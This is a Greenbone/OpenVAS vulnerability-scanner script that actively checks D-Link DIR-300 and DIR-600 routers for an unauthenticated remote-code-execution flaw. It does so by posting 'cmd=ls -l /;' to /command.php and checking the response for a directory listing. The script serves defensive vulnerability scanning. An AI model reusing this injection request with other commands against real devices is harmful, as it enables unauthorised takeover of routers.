# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# nb: Running against all DIR devices just to be sure as the vendor is known to usually have a wide
# range of affected devices even not actually mentioned as affected.
CPE_PREFIX = "cpe:/o:dlink:dir";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103656");
  script_version("2025-08-08T15:44:57+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-08-08 15:44:57 +0000 (Fri, 08 Aug 2025)");
  script_tag(name:"creation_date", value:"2013-02-05 16:00:07 +0100 (Tue, 05 Feb 2013)");

  script_cve_id("CVE-2013-10048", "CVE-2013-10069");

  script_name("D-Link DIR-300 / DIR-600 RCE Vulnerabilities (Feb 2013) - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_dlink_dir_consolidation.nasl");
  script_mandatory_keys("d-link/dir/http/detected");
  script_require_ports("Services/www", 8080);

  script_xref(name:"URL", value:"https://packetstorm.news/files/id/120052");
  script_xref(name:"URL", value:"https://web.archive.org/web/20221203170845/http://www.s3cur1ty.de/m1adv2013-003");
  script_xref(name:"URL", value:"https://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/24453");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/27528");
  script_xref(name:"URL", value:"https://service.dlink.co.in/resources/EOL-Products-Without-Service.pdf");
  script_xref(name:"URL", value:"https://legacy.us.dlink.com/");

  script_tag(name:"summary", value:"D-Link DIR-300 and DIR-600 devices are prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"This vulnerability was known to be exploited by the IoT Botnet
  'Reaper' in 2017.");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary
  code in the context of the affected application. Failed exploit attempts may result in a
  denial-of-service condition.");

  script_tag(name:"affected", value:"The following devices are known to be affected:

  - DIR-300 firmware versions 2.12 and 2.13

  - DIR-600 firmware versions 2.12b02, 2.13b01 and 2.14b01

  Other models or versions might be affected as well.");

  script_tag(name:"solution", value:"No solution was made available by the vendor. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.

  Note: Vendor states that DIR-300 and DIR-600 reached their End-of-Support Date in 2010, they are
  no longer supported, and firmware development has ceased. See vendor advisory for further
  recommendations.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

ex = "cmd=ls -l /;";
len = strlen(ex);
url = "/command.php";
host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
             "Referer: http://", host, "/\r\n",
             "Content-Length: ", len, "\r\n",
             "Cookie: uid=vttest\r\n",
             "\r\n",
             ex);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("www" >< res && "sbin" >< res && "var" >< res && "drwxrwxr-x" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
